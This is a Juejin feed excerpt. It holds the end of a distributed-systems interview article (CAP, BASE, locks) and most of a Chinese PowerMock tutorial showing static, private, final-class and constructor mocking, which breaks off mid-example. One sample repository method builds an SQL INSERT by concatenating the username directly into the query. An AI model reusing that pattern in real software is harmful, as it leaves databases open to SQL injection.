            <span class="hljs-comment">//关闭支付</span>
            <span class="hljs-selector-tag">elegentPay</span><span class="hljs-selector-class">.closePay</span>( orderEntity.<span class="hljs-built_in">getOrderNo</span>(),orderEntity.<span class="hljs-built_in">getPayType</span>() );
        }
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-42">总结：</h3>
<p>（１）请问你如何理解CAP定理 ？</p>
<p>CAP 定理阐述一个观点： C（一致性）A（可用性）P（分区容错） 不能同时满足。</p>
<p>CP系统： ZK \ consul</p>
<p>AP系统： redis NACOS</p>
<p>（２）什么是BASE理论</p>
<p>基本可用 软状态 最终一致性。</p>
<p>（３）你在项目中是否使用过分布锁？</p>
<p>是，用过。我们使用CONSUL的原因。[分析分布式锁单机版单点故障、红锁性能损失角度逐步分析 ]</p>
<p>（４）你在项目中是否使用过线程池技术？</p>
<p>是，用过。</p>
<p>（５）分布式锁有哪些？</p>
<p>（６）REDISSION分布式锁你是怎么实现的？ 答：常见方法．引出框架和CONSUL分布式锁。</p>
<p>（７）延迟消息你项目中场景是什么？</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用好PowerMock，轻松搞定那些让你头疼的单元测试]]></title>    <link>https://juejin.cn/post/7575102209606221850</link>    <guid>https://juejin.cn/post/7575102209606221850</guid>    <pubDate>2025-11-23T08:26:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575102209606221850" data-draft-id="7575119254313844762" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用好PowerMock，轻松搞定那些让你头疼的单元测试"/> <meta itemprop="keywords" content="后端,单元测试"/> <meta itemprop="datePublished" content="2025-11-23T08:26:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java随想录"/> <meta itemprop="url" content="https://juejin.cn/user/2837192913204935"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用好PowerMock，轻松搞定那些让你头疼的单元测试
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2837192913204935/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java随想录
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:26:47.000Z" title="Sun Nov 23 2025 08:26:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文已收录至GitHub，推荐阅读 👉 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FBookSea4j%2FJavaRecord" target="_blank" title="https://github.com/BookSea4j/JavaRecord" ref="nofollow noopener noreferrer">Java随想录</a></p>
<p>微信公众号：Java随想录</p>
<p>结合 <a href="https://juejin.cn/post/7498580969286631434" target="_blank" title="https://juejin.cn/post/7498580969286631434">不用Mockito写单元测试？你可能在浪费一半时间</a> 阅读体验更佳。</p>
<blockquote>
<p>面对无法Mock的静态方法、私有方法和final类，PowerMock为你打开一扇新的大门</p>
</blockquote>
<p>作为一名Java开发者，单元测试是我们保证代码质量的重要环节。但在实际工作中，我们经常会遇到一些难以测试的代码场景：静态工具类、final类、私有方法等。传统的Mockito框架对这些情况束手无策，而PowerMock的出现正好解决了这些痛点。</p>
<h2 data-id="heading-0">PowerMock是什么？为什么需要它？</h2>
<h3 data-id="heading-1">PowerMock的核心定位</h3>
<p>PowerMock是一个强大的Java单元测试框架，它通过扩展现有的Mock框架（如Mockito和EasyMock），提供了更强大的Mock能力。<strong>PowerMock的核心价值在于它能够Mock那些传统Mock工具无法处理的情况</strong>，包括静态方法、final类和方法、私有方法、构造函数等。</p>
<p>与普通Mock框架不同，PowerMock使用自定义的类加载器和字节码操作技术（基于Javassist和ASM库），在运行时修改类的行为，从而实现对这些"难以Mock"的场景的完全控制。</p>
<h3 data-id="heading-2">PowerMock与Mockito的关系和区别</h3>
<p>虽然PowerMock和Mockito都是用于单元测试的Mock框架，但它们在功能和定位上有着明显的区别：</p>
<p><strong>Mockito</strong>是一个轻量级、简单易用的Mock框架，适用于大多数日常测试场景。但它有明显的局限性：无法Mock静态方法、final类、私有方法和构造函数等。</p>
<p><strong>PowerMock</strong>则是对Mockito的增强，填补了Mockito的功能空白。它不是替代Mockito，而是与Mockito协同工作，共同构建完整的单元测试解决方案。</p>
<p>两者核心区别体现在底层实现上：Mockito使用动态代理（CGLIB）技术，而PowerMock通过修改字节码来实现更强大的Mock能力。</p>
<p>正因为这种根本差异，PowerMock可以解决Mockito无法解决的问题。</p>
<h3 data-id="heading-3">PowerMock解决的痛点</h3>
<p>在日常开发中，我们经常会遇到以下测试难题：</p>
<ul>
<li><strong>静态工具类</strong>：如各种Util类中的静态方法。</li>
<li><strong>final类和final方法</strong>：特别是第三方库中的final类。</li>
<li><strong>私有方法</strong>：需要直接测试的私有方法逻辑。</li>
<li><strong>构造函数依赖</strong>：方法内部通过new创建的对象。</li>
<li><strong>静态代码块和系统类</strong>：如System.currentTimeMillis()。</li>
</ul>
<p>这些问题使用传统Mock框架难以解决，而PowerMock为此提供了完整的解决方案</p>
<h2 data-id="heading-4">环境配置与基本用法</h2>
<h3 data-id="heading-5">添加Maven依赖</h3>
<p>要开始使用PowerMock，首先需要在项目中添加相关依赖。由于PowerMock需要与Mockito协同工作，需要同时添加两个依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- PowerMock + Mockito 组合 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.powermock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>powermock-module-junit4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.powermock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>powermock-api-mockito2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><strong>版本兼容性注意</strong>：确保PowerMock与Mockito/JUnit版本匹配，具体兼容性关系可参考官方文档。</p>
<h3 data-id="heading-6">基本配置注解</h3>
<p>使用PowerMock需要在测试类上添加必要的注解：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span> <span class="hljs-comment">// 必须使用PowerMockRunner</span>
<span class="hljs-meta">@PrepareForTest({StaticUtils.class, User.class})</span> <span class="hljs-comment">// 声明需增强的类</span>
<span class="hljs-meta">@PowerMockIgnore("javax.management.*")</span> <span class="hljs-comment">// 解决类加载器冲突</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceTest</span> {
    <span class="hljs-comment">// 测试内容</span>
}
</code></pre>
<ul>
<li><code>@RunWith(PowerMockRunner.class)</code>：告诉JUnit使用PowerMock的测试运行器。</li>
<li><code>@PrepareForTest</code>：指定需要被PowerMock修改的类（包含静态方法、final方法等的类）。</li>
<li><code>@PowerMockIgnore</code>：解决使用PowerMock后可能出现的类加载器冲突问题。</li>
</ul>
<h2 data-id="heading-7">PowerMock核心使用场景详解</h2>
<h3 data-id="heading-8">静态方法Mock</h3>
<p>静态方法是最常见的测试难点之一，让我们看看PowerMock如何解决这个问题。</p>
<p><strong>场景示例</strong>：假设我们有一个静态工具类，用于生成唯一ID：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IdGenerator</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateUniqueId</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 实际业务中可能包含复杂的逻辑或外部依赖</span>
        <span class="hljs-keyword">return</span> UUID.randomUUID().toString();
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> IdGenerator.generateUniqueId();
        <span class="hljs-comment">// 创建订单的逻辑</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ORDER_"</span> + orderId;
    }
}
</code></pre>
<p><strong>测试代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest({IdGenerator.class, OrderService.class})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderServiceTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCreateOrderWithStaticMock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 准备静态类的Mock</span>
        PowerMockito.mockStatic(IdGenerator.class);
        
        <span class="hljs-comment">// 2. 预设静态方法行为</span>
        PowerMockito.when(IdGenerator.generateUniqueId()).thenReturn(<span class="hljs-string">"123e4567"</span>);
        
        <span class="hljs-comment">// 3. 创建被测试对象并调用被测方法</span>
        <span class="hljs-type">OrderService</span> <span class="hljs-variable">orderService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderService</span>();
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> orderService.createOrder();
        
        <span class="hljs-comment">// 4. 验证结果</span>
        assertEquals(<span class="hljs-string">"ORDER_123e4567"</span>, result);
        
        <span class="hljs-comment">// 5. 验证静态方法调用（必须调用）</span>
        PowerMockito.verifyStatic(IdGenerator.class);
        IdGenerator.generateUniqueId();
    }
}
</code></pre>
<p><strong>关键点说明</strong>：</p>
<ul>
<li><code>mockStatic()</code>方法用于告诉PowerMock要Mock哪个类的静态方法</li>
<li>静态方法的Stubbing（定义行为）与普通Mockito语法类似</li>
<li><strong>必须调用</strong><code>verifyStatic()</code>来验证静态方法的调用，且需要在验证前调用一次</li>
</ul>
<p><strong>常见坑点</strong>：忘记调用<code>verifyStatic()</code>会导致无法验证静态方法是否被正确调用。</p>
<h3 data-id="heading-9">私有方法Mock</h3>
<p>测试私有方法一直存在争议，但在某些场景下（如复杂算法验证）确实有必要直接测试私有方法。</p>
<p><strong>场景示例</strong>：一个包含复杂校验逻辑的UserService：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">validateUser</span><span class="hljs-params">(String username, String password)</span> {
        <span class="hljs-keyword">if</span> (!isValidFormat(username) || !isValidFormat(password)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">return</span> internalComplexValidation(username, password);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidFormat</span><span class="hljs-params">(String input)</span> {
        <span class="hljs-comment">// 复杂的格式校验逻辑</span>
        <span class="hljs-keyword">return</span> input != <span class="hljs-literal">null</span> &amp;&amp; input.length() &gt;= <span class="hljs-number">5</span>;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">internalComplexValidation</span><span class="hljs-params">(String username, String password)</span> {
        <span class="hljs-comment">// 非常复杂的内部校验逻辑</span>
        <span class="hljs-comment">// 可能涉及加密、数据库查询等</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 简化示例</span>
    }
}
</code></pre>
<p><strong>测试代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest(UserService.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceTest</span> {

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testPrivateMethod</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 1. 创建被测类的Spy对象（部分真实调用）</span>
        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserService</span>();
        <span class="hljs-type">UserService</span> <span class="hljs-variable">spyService</span> <span class="hljs-operator">=</span> PowerMockito.spy(userService);

        <span class="hljs-comment">// 2. Stubbing：预设私有方法行为</span>
        PowerMockito.doReturn(<span class="hljs-literal">true</span>).when(spyService, <span class="hljs-string">"isValidFormat"</span>, Mockito.anyString());

        <span class="hljs-comment">// 3. 调用被测方法</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> spyService.validateUser(<span class="hljs-string">"testuser"</span>, <span class="hljs-string">"testpass"</span>);

        <span class="hljs-comment">// 4. 验证结果</span>
        assertTrue(result);

        <span class="hljs-comment">// 5. 验证私有方法被调用（可选）</span>
        PowerMockito.verifyPrivate(spyService,Mockito.times(<span class="hljs-number">2</span>))
                .invoke(<span class="hljs-string">"isValidFormat"</span>, Mockito.anyString());
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testPrivateMethodWithArguments</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserService</span>();
        <span class="hljs-type">UserService</span> <span class="hljs-variable">spyService</span> <span class="hljs-operator">=</span> PowerMockito.spy(userService);

        <span class="hljs-comment">// Mock有参数的私有方法</span>
        PowerMockito.doReturn(<span class="hljs-literal">false</span>)
                .when(spyService, <span class="hljs-string">"internalComplexValidation"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"pass"</span>);

        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> spyService.validateUser(<span class="hljs-string">"user"</span>, <span class="hljs-string">"pass"</span>);

        assertFalse(result);
    }
}
</code></pre>
<p><strong>关键点说明</strong>：</p>
<ul>
<li>使用<code>spy()</code>方法创建对象，这样未被Mock的方法会保持真实行为。</li>
<li>使用<code>doReturn().when()</code>语法来Mock私有方法，需通过方法名字符串指定目标方法。</li>
<li>可以通过<code>verifyPrivate()</code>验证私有方法的调用。</li>
</ul>
<p><strong>最佳实践</strong>：优先通过公共方法测试私有逻辑，仅在复杂算法验证等特殊场景下直接测试私有方法。</p>
<h3 data-id="heading-10">final类与方法Mock</h3>
<p>final类和方法由于其不可继承性，在传统Mock框架中无法被Mock，但PowerMock完美解决了这个问题。</p>
<p><strong>场景示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalUtility</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String <span class="hljs-title function_">finalMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Final implementation"</span>;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String <span class="hljs-title function_">staticFinalMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Static final implementation"</span>;
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SomeService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">FinalUtility</span> <span class="hljs-variable">utility</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FinalUtility</span>();
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">useFinalClass</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> utility.finalMethod() + <span class="hljs-string">"_processed"</span>;
    }
}
</code></pre>
<p><strong>测试代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest({FinalUtility.class, SomeService.class})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SomeServiceTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testFinalClassAndMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 创建final类的Mock对象</span>
        <span class="hljs-type">FinalUtility</span> <span class="hljs-variable">mockUtility</span> <span class="hljs-operator">=</span> PowerMockito.mock(FinalUtility.class);
        
        <span class="hljs-comment">// 2. 预设final方法行为</span>
        PowerMockito.when(mockUtility.finalMethod()).thenReturn(<span class="hljs-string">"Mocked final"</span>);
        
        <span class="hljs-comment">// 3. 当创建真实对象时返回Mock对象</span>
        PowerMockito.whenNew(FinalUtility.class).withNoArguments().thenReturn(mockUtility);
        
        <span class="hljs-comment">// 4. 测试</span>
        <span class="hljs-type">SomeService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SomeService</span>();
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> service.useFinalClass();
        
        assertEquals(<span class="hljs-string">"Mocked final_processed"</span>, result);
    }
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testStaticFinalMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// Mock静态final方法</span>
        PowerMockito.mockStatic(FinalUtility.class);
        PowerMockito.when(FinalUtility.staticFinalMethod()).thenReturn(<span class="hljs-string">"Mocked static final"</span>);
        
        assertEquals(<span class="hljs-string">"Mocked static final"</span>, FinalUtility.staticFinalMethod());
    }
}
</code></pre>
<p><strong>底层原理</strong>：PowerMock通过修改字节码，去除了final方法的final标识符，从而允许Mock操作。</p>
<h3 data-id="heading-11">构造函数Mock</h3>
<p>当方法内部直接通过new创建对象时，传统Mock难以介入，PowerMock的构造函数Mock功能为此提供了解决方案。</p>
<p><strong>场景示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseConnection</span> {
    <span class="hljs-keyword">private</span> String connectionString;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DatabaseConnection</span><span class="hljs-params">(String connectionString)</span> {
        <span class="hljs-built_in">this</span>.connectionString = connectionString;
        <span class="hljs-comment">// 可能包含复杂的初始化逻辑</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String sql)</span> {
        <span class="hljs-comment">// 执行SQL逻辑</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRepository</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">saveUser</span><span class="hljs-params">(String username)</span> {
        <span class="hljs-comment">// 在方法内部直接创建依赖对象</span>
        <span class="hljs-type">DatabaseConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatabaseConnection</span>(<span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>);
        <span class="hljs-keyword">return</span> connection.execute(<span class="hljs-string">"INSERT INTO users VALUES ('"</span> + username + <span class="hljs-string">"')"</span>);
    }
}
</code></pre>
<p><strong>测试代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest(UserRepository.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRepositoryTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConstructorMock</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 1. 创建Mock对象</span>
        <span class="hljs-type">DatabaseConnection</span> <span class="hljs-variable">mockConnection</span> <span class="hljs-operator">=</span> PowerMockito.mock(DatabaseConnection.class);
        
        <span class="hljs-comment">// 2. 预设构造函数行为</span>
        PowerMockito.whenNew(DatabaseConnection.class)
                   .withParameterTypes(String.class)
                   .withArguments(<span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>)
                   .thenReturn(mockConnection);
        
        <span class="hljs-comment">// 3. 预设方法行为</span>
        PowerMockito.when(mockConnection.execute(Mockito.anyString())).thenReturn(<span class="hljs-literal">true</span>);
        
        <span class="hljs-comment">// 4. 执行测试</span>
        <span class="hljs-type">UserRepository</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserRepository</span>();
        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> repository.saveUser(<span class="hljs-string">"testuser"</span>);
        
        <span class="hljs-comment">// 5. 验证</span>
        assertTrue(result);
        PowerMockito.verifyNew(DatabaseConnection.class)
                   .withArguments(<span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>);
    }
}
</code></pre>
<p><strong>关键点说明</strong>：</p>
<ul>
<li><code>whenNew()</code>用于拦截构造函数调用。</li>
<li><code>withParameterTypes()</code>和<code>withArguments()</code>用于精确匹配构造函数。</li>
<li>需要使用<code>verifyNew()</code>验证构造函数调用。</li>
</ul>
<p><strong>应用场景</strong>：适用于测试遗留代码中在方法内部直接实例化依赖对象的情况。</p>
<h3 data-id="heading-12">静态代码块处理</h3>
<p>静态代码块在类加载时执行，可能包含不愿在测试中运行的代码（如初始化昂贵资源），PowerMock可以抑制静态代码块的执行。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigurationLoader</span> {
    <span class="hljs-keyword">static</span> {
        <span class="hljs-comment">// 静态代码块，可能包含昂贵的初始化操作</span>
        loadConfigurationFromRemote();
    }
    
